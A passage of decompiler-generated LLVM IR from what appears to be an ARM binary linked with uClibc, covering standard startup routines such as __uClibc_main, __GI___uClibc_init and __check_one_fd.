  %v1_15bcc = phi i32 [ %v1_15bd8, %dec_label_pc_15bcc.dec_label_pc_15bcc_crit_edge ], [ 0, %dec_label_pc_15bcc.lr.ph ]
  %v0_15bcc = phi i32 [ %v0_15bcc.pre, %dec_label_pc_15bcc.dec_label_pc_15bcc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -8), %dec_label_pc_15bcc.lr.ph ]
  %v4_15bcc = mul i32 %v1_15bcc, 4
  %v5_15bcc = add i32 %v4_15bcc, %v0_15bcc
  %v6_15bcc = inttoptr i32 %v5_15bcc to i32*
  %v7_15bcc = load i32, i32* %v6_15bcc, align 4
  call void @__pseudo_branch(i32 %v7_15bcc)
  %v0_15bd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15bd8 = add i32 %v0_15bd8, -1
  store i32 %v1_15bd8, i32* %r4.global-to-local, align 4
  %v2_15bd8 = icmp eq i32 %v0_15bd8, 0
  br i1 %v2_15bd8, label %dec_label_pc_15be0, label %dec_label_pc_15bcc.dec_label_pc_15bcc_crit_edge

dec_label_pc_15bcc.dec_label_pc_15bcc_crit_edge:  ; preds = %dec_label_pc_15bcc
  %v0_15bcc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15bcc
  %v0_15be4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_15be4 = add i32 %v0_15be4.pre, 2000
  %v3_15be4 = inttoptr i32 %v2_15be4 to i32*
  %v4_15be4 = load i32, i32* %v3_15be4, align 4
  %v2_15be8 = icmp eq i32 %v4_15be4, 0
  br i1 %v2_15be8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_15be0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15be0, %bb
  %v2_15bf0 = xor i1 %v2_15be8, true
  call void @__pseudo_cond_branch(i1 %v2_15bf0, i32 %v4_15be4)
  %v0_15bf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15bf8 = add i32 %v0_15bf8, 2004
  %v3_15bf8 = inttoptr i32 %v2_15bf8 to i32*
  %v4_15bf8 = load i32, i32* %v3_15bf8, align 4
  %v2_15bfc = icmp eq i32 %v4_15bf8, 0
  br i1 %v2_15bfc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_15c04 = xor i1 %v2_15bfc, true
  call void @__pseudo_cond_branch(i1 %v2_15c04, i32 %v4_15bf8)
  %v2_15c08 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15c08, i32* %r4.global-to-local, align 4
  %v1_15c0c = load i32, i32* @r0, align 4
  ret i32 %v1_15c0c

; uselistorder directives
  uselistorder i32 %v1_15bd8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_15c24 = load i32, i32* @r4, align 4
  %v6_15c24 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_15c38 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_15c40 = icmp eq i32 %v2_15c38, -1
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r3, align 4
  br i1 %v3_15c40, label %dec_label_pc_15c4c, label %dec_label_pc_15c64

dec_label_pc_15c4c:                               ; preds = %entry
  %v0_15c50 = load i32, i32* @r5, align 4
  %v2_15c58 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -34076), i32 %v0_15c50)
  %v1_15c5c = load i32, i32* @r4, align 4
  %v1_15c60 = icmp ne i32 %v2_15c58, %v1_15c5c
  call void @__pseudo_cond_branch(i1 %v1_15c60, i32 ptrtoint (i32* @global_var_14580.556 to i32))
  br label %dec_label_pc_15c64

dec_label_pc_15c64:                               ; preds = %entry, %dec_label_pc_15c4c
  %v1_15c6c = phi i32 [ %v2_15c38, %entry ], [ %v2_15c58, %dec_label_pc_15c4c ]
  store i32 %v3_15c24, i32* @r4, align 4
  store i32 %v6_15c24, i32* @r5, align 4
  ret i32 %v1_15c6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15c64, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15c78 = load i32, i32* @r4, align 4
  store i32 %v3_15c78, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r4.global-to-local, align 4
  %v4_15c88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 148) to i32*), align 4
  %v1_15c8c = inttoptr i32 %v4_15c88 to i32*
  %v2_15c8c = load i32, i32* %v1_15c8c, align 4
  %v2_15c90 = icmp eq i32 %v2_15c8c, 0
  br i1 %v2_15c90, label %dec_label_pc_15c98, label %dec_label_pc_15cbc

dec_label_pc_15c98:                               ; preds = %entry
  store i32 4096, i32* %v1_15c8c, align 4
  %v0_15ca0 = call i32 @__pthread_initialize_minimal()
  %v0_15ca8 = load i32, i32* %r4.global-to-local, align 4
  %v2_15ca8 = add i32 %v0_15ca8, -48076
  %v2_15cb0 = icmp eq i32 %v2_15ca8, 0
  br i1 %v2_15cb0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_15c98
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_15c98, %bb
  %v2_15cb8 = xor i1 %v2_15cb0, true
  call void @__pseudo_cond_branch(i1 %v2_15cb8, i32 %v2_15ca8)
  %v2_15cbc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %entry, %bb4
  %v2_15cbc = phi i32 [ %v2_15cbc.pre, %bb4 ], [ %v3_15c78, %entry ]
  %.0 = phi i32 [ %v0_15ca0, %bb4 ], [ undef, %entry ]
  store i32 %v2_15cbc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15cbc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 54048, i32* %r4.global-to-local, align 4
  %v1_15cdc = add i32 %tmp, 4
  store i32 %v1_15cdc, i32* %ip.global-to-local, align 4
  %v2_15ce0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r4.global-to-local, align 4
  %v3_15cec = mul i32 %arg2, 4
  store i32 %v3_15cec, i32* @r7, align 4
  %v4_15cf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 24) to i32*), align 4
  store i32 %v4_15cf4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_15cfc = add i32 %v1_15cdc, %v3_15cec
  store i32 %v2_15cfc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %stack_var_-416, align 4
  %v4_15d04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 56) to i32*), align 4
  store i32 %v4_15d04, i32* %r4.global-to-local, align 4
  %v3_15d08 = icmp uge i32 %v2_15cfc, %v2_15ce0
  store i1 %v3_15d08, i1* %cpsr_c.global-to-local, align 1
  %v9_15d08 = icmp eq i32 %v2_15cfc, %v2_15ce0
  store i1 %v9_15d08, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_15d10 = inttoptr i32 %v4_15d04 to i32*
  store i32 %v2_15cfc, i32* %v2_15d10, align 4
  br i1 %v9_15d08, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_15d18 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d18 = load i32, i32* %r1.global-to-local, align 4
  %v2_15d18 = inttoptr i32 %v1_15d18 to i32*
  store i32 %v0_15d18, i32* %v2_15d18, align 4
  %v2_15d1c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15d1c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2004, i32* %r2.global-to-local, align 4
  %v0_15d28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15d28, i32* @r6, align 4
  br i1 %v9_15d08, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_15d3053 = add i32 %v2_15d1c, 2004
  %v4_15d3054 = inttoptr i32 %v3_15d3053 to i32*
  store i32 %arg6, i32* %v4_15d3054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_15d2c = load i32, i32* %ip.global-to-local, align 4
  %v2_15d2c = load i32, i32* @r7, align 4
  %v3_15d2c = add i32 %v2_15d2c, %v1_15d2c
  store i32 %v3_15d2c, i32* %r3.global-to-local, align 4
  %v3_15d3050 = add i32 %v2_15d1c, 2004
  %v4_15d3051 = inttoptr i32 %v3_15d3050 to i32*
  store i32 %arg6, i32* %v4_15d3051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15d3c = load i32, i32* %r3.global-to-local, align 4
  %v2_15d3c = load i32, i32* %r4.global-to-local, align 4
  %v3_15d3c = inttoptr i32 %v2_15d3c to i32*
  store i32 %v1_15d3c, i32* %v3_15d3c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15d40 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15d40, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15d48 = bitcast i32* %stack_var_-120 to i8*
  %v4_15d48 = call i32 @__GI_memset(i8* %v3_15d48, i32 0, i32 120)
  store i32 %v4_15d48, i32* %r0.global-to-local, align 4
  %v0_15d4c = load i32, i32* %r4.global-to-local, align 4
  %v1_15d4c = inttoptr i32 %v0_15d4c to i32*
  %v2_15d4c = load i32, i32* %v1_15d4c, align 4
  br label %dec_label_pc_15d58

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d58, %bb77
  %storemerge = phi i32 [ %v2_15d4c, %bb77 ], [ %v1_15d64, %dec_label_pc_15d58 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15d58 = inttoptr i32 %storemerge to i32*
  %v2_15d58 = load i32, i32* %v1_15d58, align 4
  store i32 %v2_15d58, i32* %r3.global-to-local, align 4
  %v2_15d5c = icmp eq i32 %v2_15d58, 0
  %v1_15d64 = add i32 %storemerge, 4
  br i1 %v2_15d5c, label %dec_label_pc_15d64, label %dec_label_pc_15d58

dec_label_pc_15d64:                               ; preds = %dec_label_pc_15d58
  store i32 %v1_15d64, i32* @r4, align 4
  store i32 %v2_15d40, i32* @r5, align 4
  %v1_15d8830 = inttoptr i32 %v1_15d64 to i32*
  %v2_15d8831 = load i32, i32* %v1_15d8830, align 4
  store i32 %v2_15d8831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d8c33 = icmp eq i32 %v2_15d8831, 0
  store i1 %v2_15d8c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d8c33, label %dec_label_pc_15d94, label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d64, %dec_label_pc_15d88
  %v4_15d78 = phi i32 [ %v1_15d84, %dec_label_pc_15d88 ], [ %v1_15d64, %dec_label_pc_15d64 ]
  %v5_15d74 = phi i32 [ %v2_15d88, %dec_label_pc_15d88 ], [ %v2_15d8831, %dec_label_pc_15d64 ]
  %v2_15d70 = icmp ugt i32 %v5_15d74, 13
  store i1 %v2_15d70, i1* %cpsr_c.global-to-local, align 1
  %v7_15d70 = icmp eq i32 %v5_15d74, 14
  store i1 %v7_15d70, i1* %cpsr_z.global-to-local, align 1
  %v2_15d74 = xor i1 %v2_15d70, true
  %v3_15d74 = or i1 %v7_15d70, %v2_15d74
  br i1 %v3_15d74, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15d70
  %v4_15d74 = load i32, i32* @r5, align 4
  %v6_15d74 = and i32 %v5_15d74, 536870912
  %v7_15d74 = icmp ne i32 %v6_15d74, 0
  store i1 %v7_15d74, i1* %cpsr_c.global-to-local, align 1
  %v8_15d74 = mul i32 %v5_15d74, 8
  %v9_15d74 = add i32 %v4_15d74, %v8_15d74
  store i32 %v9_15d74, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15d70, %bb78
  %v1_15d80 = phi i1 [ %v2_15d70, %dec_label_pc_15d70 ], [ %v7_15d74, %bb78 ]
  %v2_15d78 = xor i1 %v1_15d80, true
  %v3_15d78 = or i1 %v7_15d70, %v2_15d78
  br i1 %v3_15d78, label %bb80, label %dec_label_pc_15d88

bb80:                                             ; preds = %bb79
  store i32 %v4_15d78, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d88

dec_label_pc_15d88:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15d78, i32 ptrtoint (i32* @global_var_129f0.565 to i32))
  %v0_15d84 = load i32, i32* @r4, align 4
  %v1_15d84 = add i32 %v0_15d84, 8
  store i32 %v1_15d84, i32* @r4, align 4
  %v1_15d88 = inttoptr i32 %v1_15d84 to i32*
  %v2_15d88 = load i32, i32* %v1_15d88, align 4
  store i32 %v2_15d88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d8c = icmp eq i32 %v2_15d88, 0
  store i1 %v2_15d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d8c, label %dec_label_pc_15d94, label %dec_label_pc_15d70

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d88, %dec_label_pc_15d64
  store i32 %v2_15d40, i32* %r0.global-to-local, align 4
  %v1_15d98 = call i32 @_dl_aux_init(i32 %v2_15d40)
  store i32 %v1_15d98, i32* %r0.global-to-local, align 4
  %v1_15d9c = call i32 @__GI___uClibc_init(i32 %v1_15d98)
  store i32 %v1_15d9c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15da4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15da4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_15dac = add i32 %v2_15da4, 148
  %v3_15dac = inttoptr i32 %v2_15dac to i32*
  %v4_15dac = load i32, i32* %v3_15dac, align 4
  store i32 %v4_15dac, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15db4 = icmp eq i32 %tmp66, 0
  store i1 %v2_15db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15db4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15d94
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15d94, %bb81
  %v0_15dc0 = phi i32 [ %tmp66, %dec_label_pc_15d94 ], [ 4096, %bb81 ]
  %v3_15dbc = icmp eq i32 %tmp65, -1
  store i1 %v3_15dbc, i1* %cpsr_c.global-to-local, align 1
  %v8_15dbc = icmp eq i32 %tmp65, -1
  store i1 %v8_15dbc, i1* %cpsr_z.global-to-local, align 1
  %v2_15dc0 = inttoptr i32 %v4_15dac to i32*
  store i32 %v0_15dc0, i32* %v2_15dc0, align 4
  br i1 %v3_15dbc, label %dec_label_pc_15dc8, label %dec_label_pc_15df0

dec_label_pc_15dc8:                               ; preds = %bb82
  %v0_15dc8 = call i32 @getuid()
  store i32 %v0_15dc8, i32* @r0, align 4
  store i32 %v0_15dc8, i32* %r4.global-to-local, align 4
  %v0_15dd0 = call i32 @geteuid()
  store i32 %v0_15dd0, i32* @r0, align 4
  %v3_15dd4 = icmp uge i32 %v0_15dc8, %v0_15dd0
  store i1 %v3_15dd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd4 = icmp eq i32 %v0_15dc8, %v0_15dd0
  store i1 %v9_15dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15dd4, label %dec_label_pc_15ddc, label %dec_label_pc_15e18

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dc8
  %v1_15ddc = call i32 @getgid(i32 %v0_15dd0)
  store i32 %v1_15ddc, i32* @r0, align 4
  store i32 %v1_15ddc, i32* %r4.global-to-local, align 4
  %v0_15de4 = call i32 @getegid()
  store i32 %v0_15de4, i32* %r0.global-to-local, align 4
  %v3_15de8 = icmp uge i32 %v1_15ddc, %v0_15de4
  store i1 %v3_15de8, i1* %cpsr_c.global-to-local, align 1
  %v9_15de8 = icmp eq i32 %v1_15ddc, %v0_15de4
  store i1 %v9_15de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15de8, label %dec_label_pc_15df0, label %dec_label_pc_15e18

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15ddc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_15dbc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_15dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15dbc, label %dec_label_pc_15e40, label %dec_label_pc_15dfc

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15df0
  store i32 %tmp64, i32* @r3, align 4
  %v3_15e00 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15e00, i1* %cpsr_c.global-to-local, align 1
  %v9_15e00 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e00, label %dec_label_pc_15e08, label %dec_label_pc_15e18

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15dfc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15e10 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15e10, i1* %cpsr_c.global-to-local, align 1
  %v9_15e10 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15e10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e10, label %dec_label_pc_15e40, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15dfc, %dec_label_pc_15ddc, %dec_label_pc_15dc8, %dec_label_pc_15e08
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_15e24 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_15e2c = load i32, i32* @r4, align 4
  store i32 %v0_15e2c, i32* %r1.global-to-local, align 4
  %v2_15e30 = call i32 @__check_one_fd(i32 1, i32 %v0_15e2c)
  %v0_15e34 = load i32, i32* @r4, align 4
  store i32 %v0_15e34, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15e3c = call i32 @__check_one_fd(i32 2, i32 %v0_15e34)
  store i32 %v2_15e3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e08, %dec_label_pc_15df0, %dec_label_pc_15e18
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v2_15e48 = load i32, i32* %arg3, align 4
  store i32 %v2_15e48, i32* %r2.global-to-local, align 4
  %v2_15e4c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15e4c, i32* %r1.global-to-local, align 4
  %v3_15e50 = add i32 %v2_15e4c, 256
  %v4_15e50 = inttoptr i32 %v3_15e50 to i32*
  store i32 %v2_15e48, i32* %v4_15e50, align 4
  %v0_15e54 = load i32, i32* %r0.global-to-local, align 4
  %v1_15e54 = inttoptr i32 %v0_15e54 to i32*
  %v2_15e54 = load i32, i32* %v1_15e54, align 4
  store i32 %v2_15e54, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e58 = icmp eq i32 %v2_15e54, 0
  store i1 %v2_15e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e58, label %bb84, label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e40
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15e64 = load i32, i32* %r1.global-to-local, align 4
  %v2_15e64 = add i32 %v0_15e64, 164
  %v3_15e64 = inttoptr i32 %v2_15e64 to i32*
  %v4_15e64 = load i32, i32* %v3_15e64, align 4
  store i32 %v4_15e64, i32* %r3.global-to-local, align 4
  %v2_15e68 = inttoptr i32 %v4_15e64 to i32*
  store i32 %v2_15e54, i32* %v2_15e68, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15e70 = load i32, i32* %r0.global-to-local, align 4
  %v1_15e70 = inttoptr i32 %v0_15e70 to i32*
  %v2_15e70 = load i32, i32* %v1_15e70, align 4
  store i32 %v2_15e70, i32* %r0.global-to-local, align 4
  %v4_15e74 = call i32 @__GI_strrchr(i32 %v2_15e70, i32 47, i32 %v2_15e48, i32 %v4_15e64)
  store i32 %v4_15e74, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_15e7c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15e7c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e80 = icmp eq i32 %v4_15e74, 0
  store i1 %v2_15e80, i1* %cpsr_z.global-to-local, align 1
  %v2_15e84 = add i32 %v2_15e7c, 96
  %v3_15e84 = inttoptr i32 %v2_15e84 to i32*
  %v4_15e84 = load i32, i32* %v3_15e84, align 4
  store i32 %v4_15e84, i32* %r2.global-to-local, align 4
  br i1 %v2_15e80, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15e60
  %v2_15e8c58 = inttoptr i32 %v4_15e84 to i32*
  store i32 0, i32* %v2_15e8c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15e60
  %v2_15e88 = add i32 %v4_15e74, 1
  store i32 %v2_15e88, i32* %r3.global-to-local, align 4
  %v2_15e8c = inttoptr i32 %v4_15e84 to i32*
  store i32 %v4_15e74, i32* %v2_15e8c, align 4
  %v1_15e90 = load i32, i32* %r3.global-to-local, align 4
  %v2_15e90 = load i32, i32* %r2.global-to-local, align 4
  %v3_15e90 = inttoptr i32 %v2_15e90 to i32*
  store i32 %v1_15e90, i32* %v3_15e90, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15e40
  %v2_15ea0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15ea0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_15eac = add i32 %v2_15ea0, -12
  store i32 %v2_15eac, i32* %r5.global-to-local, align 4
  store i32 2000, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_15ebc = add i32 %v2_15ea0, 2000
  %v4_15ebc = inttoptr i32 %v3_15ebc to i32*
  store i32 %arg5, i32* %v4_15ebc, align 4
  %v0_15ed418 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ed419 = load i32, i32* %r7.global-to-local, align 4
  %v3_15ed421 = icmp uge i32 %v0_15ed418, %v1_15ed419
  store i1 %v3_15ed421, i1* %cpsr_c.global-to-local, align 1
  %v9_15ed427 = icmp eq i32 %v0_15ed418, %v1_15ed419
  store i1 %v9_15ed427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15ed421, label %dec_label_pc_15f08.lr.ph, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %bb84, %dec_label_pc_15ec4
  %v1_15ec4 = phi i32 [ %v1_15ed0, %dec_label_pc_15ec4 ], [ %v0_15ed418, %bb84 ]
  %v0_15ec4 = load i32, i32* %r5.global-to-local, align 4
  %v2_15ec4 = and i32 %v1_15ec4, 1073741824
  %v3_15ec4 = icmp ne i32 %v2_15ec4, 0
  store i1 %v3_15ec4, i1* %cpsr_c.global-to-local, align 1
  %v4_15ec4 = mul i32 %v1_15ec4, 4
  %v5_15ec4 = add i32 %v4_15ec4, %v0_15ec4
  %v6_15ec4 = inttoptr i32 %v5_15ec4 to i32*
  %v7_15ec4 = load i32, i32* %v6_15ec4, align 4
  store i32 %v7_15ec4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15ec4)
  %v0_15ed0 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ed0 = add i32 %v0_15ed0, 1
  store i32 %v1_15ed0, i32* %r4.global-to-local, align 4
  %v1_15ed4 = load i32, i32* %r7.global-to-local, align 4
  %v3_15ed4 = icmp uge i32 %v1_15ed0, %v1_15ed4
  store i1 %v3_15ed4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ed4 = icmp eq i32 %v1_15ed0, %v1_15ed4
  store i1 %v9_15ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15ed4, label %dec_label_pc_15f08.lr.ph, label %dec_label_pc_15ec4

dec_label_pc_15f08.lr.ph:                         ; preds = %dec_label_pc_15ec4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15edc = icmp eq i32 %v0_15d28, 0
  store i1 %v2_15edc, i1* %cpsr_z.global-to-local, align 1
  %v2_15ee4 = xor i1 %v2_15edc, true
  call void @__pseudo_cond_branch(i1 %v2_15ee4, i32 %v0_15d28)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15ef0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_15efc = add i32 %v2_15ef0, -12
  store i32 %v2_15efc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15f08

dec_label_pc_15f08:                               ; preds = %dec_label_pc_15f08.dec_label_pc_15f08_crit_edge, %dec_label_pc_15f08.lr.ph
  %v1_15f08 = phi i32 [ %v1_15f14, %dec_label_pc_15f08.dec_label_pc_15f08_crit_edge ], [ 0, %dec_label_pc_15f08.lr.ph ]
  %v0_15f08 = phi i32 [ %v0_15f08.pre, %dec_label_pc_15f08.dec_label_pc_15f08_crit_edge ], [ %v2_15efc, %dec_label_pc_15f08.lr.ph ]
  %v2_15f08 = and i32 %v1_15f08, 1073741824
  %v3_15f08 = icmp ne i32 %v2_15f08, 0
  store i1 %v3_15f08, i1* %cpsr_c.global-to-local, align 1
  %v4_15f08 = mul i32 %v1_15f08, 4
  %v5_15f08 = add i32 %v4_15f08, %v0_15f08
  %v6_15f08 = inttoptr i32 %v5_15f08 to i32*
  %v7_15f08 = load i32, i32* %v6_15f08, align 4
  store i32 %v7_15f08, i32* %ip.global-to-local, align 4
  store i32 89876, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15f08)
  %v0_15f14 = load i32, i32* @r4, align 4
  %v1_15f14 = add i32 %v0_15f14, 1
  store i32 %v1_15f14, i32* @r4, align 4
  %v1_15f18 = load i32, i32* @r7, align 4
  %v3_15f18 = icmp uge i32 %v1_15f14, %v1_15f18
  store i1 %v3_15f18, i1* %cpsr_c.global-to-local, align 1
  %v9_15f18 = icmp eq i32 %v1_15f14, %v1_15f18
  store i1 %v9_15f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15f18, label %dec_label_pc_15f20, label %dec_label_pc_15f08.dec_label_pc_15f08_crit_edge

dec_label_pc_15f08.dec_label_pc_15f08_crit_edge:  ; preds = %dec_label_pc_15f08
  %v0_15f08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f08

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15f08
  %v2_15f24.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f24.pre, i32* %r0.global-to-local, align 4
